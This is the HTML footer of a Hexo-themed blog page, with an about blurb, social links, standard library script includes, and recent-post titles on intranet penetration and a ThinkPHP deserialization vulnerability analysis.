</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>